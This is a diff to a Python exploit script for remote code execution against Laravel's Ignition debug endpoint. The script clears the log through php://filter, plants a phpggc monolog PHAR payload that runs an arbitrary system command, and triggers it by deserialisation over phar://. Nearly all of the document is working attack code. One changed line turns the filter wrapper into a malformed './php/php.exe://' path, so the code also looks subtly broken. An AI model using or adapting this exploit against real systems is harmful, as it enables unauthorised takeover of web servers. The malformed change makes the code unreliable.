@@ -3,19 +3,17 @@ import re
 import sys
 from dataclasses import dataclass
 import os
-import requests
-
+import urllib.request
+import json
 
 @dataclass
 class Exploit:
-    session: requests.Session
     url: str
     payload: bytes
     log_path: str
 
     def main(self):
-        if not self.log_path:
-            self.log_path = self.get_log_path()
+        if not self.log_path: self.log_path = self.get_log_path()
         
         try:
             self.clear_logs()
@@ -34,20 +32,20 @@ class Exploit:
 
     def get_log_path(self):
         r = self.run_wrapper('DOESNOTEXIST')
-        match = re.search(r'"file":"(\\/[^"]+?)\\/vendor\\/[^"]+?"', r.text)
+        match = re.search(r'"file":"(\\/[^"]+?)\\/vendor\\/[^"]+?"', r.get('text',''))
         if not match:
             self.failure('Unable to find full path')
         path = match.group(1).replace('\\/', '/')
         path = f'{path}/storage/logs/laravel.log'
         r = self.run_wrapper(path)
-        if r.status_code != 200:
+        if r.get('status') != 200:
             self.failure('Log file does not exist: {}', path)
 
         self.success('Log file: {}', path)
         return path
     
     def clear_logs(self):
-        wrapper = f'php://filter/read=consumed/resource={self.log_path}'
+        wrapper = f'./php/php.exe://filter/read=consumed/resource={self.log_path}'
         self.run_wrapper(wrapper)
         self.success('Logs cleared')
         return True
@@ -62,16 +60,31 @@ class Exploit:
 
     def run_wrapper(self, wrapper):
         solution = "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"
-        return self.session.post(
-            self.url + '/_ignition/execute-solution/',
-            json={
-                "solution": solution,
-                "parameters": {
-                    "viewFile": wrapper,
-                    "variableName": "doesnotexist"
-                }
+        endpoint = f"{self.url}/_ignition/execute-solution/"
+        data = {
+            "solution": solution,
+            "parameters": {
+                "viewFile": wrapper,
+                "variableName": "doesnotexist"
             }
-        )
+        }
+        return self.make_post_request(endpoint, json.dumps(data))
+
+
+    def make_post_request(self, url, data):
+        headers = {"Content-Type": "application/json"}
+        data_bytes = data.encode('utf-8')
+        req = urllib.request.Request(url, data=data_bytes, headers=headers, method="POST")
+        try:
+            with urllib.request.urlopen(req) as response:
+                return {
+                    'status': response.getcode(),
+                    'text': response.read().decode('utf-8')
+                }
+        except urllib.error.HTTPError as e:
+            return {'status': e.code, 'text': e.read().decode('utf-8')}
+        except urllib.error.URLError as e:
+            self.failure('Network error: {}', e.reason)
 
     def put_payload(self):
         payload = self.generate_payload()
@@ -90,7 +103,7 @@ class Exploit:
     def convert_to_phar(self):
         wrapper = self.get_write_filter()
         r = self.run_wrapper(wrapper)
-        if r.status_code == 200:
+        if r.get('status') == 200:
             self.success('Successfully converted to PHAR !')
         else:
             self.failure('Convertion to PHAR failed (try again ?)')
@@ -98,17 +111,17 @@ class Exploit:
     def run_phar(self):
         wrapper = f'phar://{self.log_path}/test.txt'
         r = self.run_wrapper(wrapper)
-        if r.status_code != 500:
+        if r.get('status') != 500:
             self.failure('Deserialisation failed ?!!')
         self.success('Phar deserialized')
         # We might be able to read the output of system, but if we can't, it's ok
-        match = re.search('^(.*?)\n<!doctype html>\n<html class="', r.text, flags=re.S)
+        match = re.search('^(.*?)\n<!doctype html>\n<html class="', r.get('text',''), flags=re.S)
 
         if match:
             print('--------------------------')
             print(match.group(1))
             print('--------------------------')
-        elif 'phar error: write operations' in r.text:
+        elif 'phar error: write operations' in r.get('text',''):
             print('Exploit succeeded')
         else:
             print('Done')
@@ -117,8 +130,7 @@ class Exploit:
 def main(url, command):
     os.system(f"php -d'phar.readonly=0' ./phpggc/phpggc --phar phar -o ./exploit.phar --fast-destruct monolog/rce1 system {command}")    
     payload = open('./exploit.phar', 'rb').read()
-    session = requests.Session()
-    exploit = Exploit(session, url.rstrip('/'), payload, None)
+    exploit = Exploit(url.rstrip('/'), payload, None)
     exploit.main()
 
 
